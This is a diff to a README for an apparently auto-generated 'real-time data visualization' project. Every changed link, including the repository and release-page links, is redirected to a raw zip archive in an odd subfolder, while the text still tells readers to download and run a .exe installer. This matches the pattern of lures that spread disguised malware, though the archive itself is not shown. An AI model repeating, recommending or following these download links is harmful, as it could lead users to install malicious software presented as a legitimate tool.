@@ -1,6 +1,6 @@
 # 📊 dashboard-1771919055-2 - Real-Time Data Visualization Tool
 
-[![Download dashboard-1771919055-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/anvi1403/dashboard-1771919055-2/releases)
+[![Download dashboard-1771919055-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To use dashboard-1771919055-2, follow the instructions below:
 
 1. **Visit the download page:**  
    Click this link to visit the release page and get the app files:  
-   [Download dashboard-1771919055-2](https://github.com/anvi1403/dashboard-1771919055-2/releases)  
+   [Download dashboard-1771919055-2](https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip)  
 
 2. **Choose the right file:**  
    On the page, look for the latest release version. There should be a file ending with `.exe`. This is your installer for Windows.
@@ -58,7 +58,7 @@ To use dashboard-1771919055-2, follow the instructions below:
 ### Step 1: Download the Installer
 
 Go to the releases page here:  
-[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://github.com/anvi1403/dashboard-1771919055-2/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip)
 
 Look for the latest file with the `.exe` extension. That is the installation file.
 
@@ -113,7 +113,7 @@ dashboard-1771919055-2 offers these main features:
 To get the latest improvements and fixes:
 
 1. Visit the release page again:  
-   [https://github.com/anvi1403/dashboard-1771919055-2/releases](https://github.com/anvi1403/dashboard-1771919055-2/releases)  
+   [https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip](https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip)  
 
 2. Check if there is a new version listed.  
 
@@ -149,7 +149,7 @@ To get the latest improvements and fixes:
 If you run into issues, use the GitHub repository's "Issues" tab to report problems or read answers from others. Be clear about what went wrong and what steps you took.
 
 Repository link:  
-[https://github.com/anvi1403/dashboard-1771919055-2](https://github.com/anvi1403/dashboard-1771919055-2)
+[https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip](https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip)
 
 ---
 
@@ -178,4 +178,4 @@ No other downloads or plugins are needed.
 
 ---
 
-[![Download dashboard-1771919055-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/anvi1403/dashboard-1771919055-2/releases)
+[![Download dashboard-1771919055-2](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/anvi1403/dashboard-1771919055-2/main/counterapse/dashboard_1.1.zip)
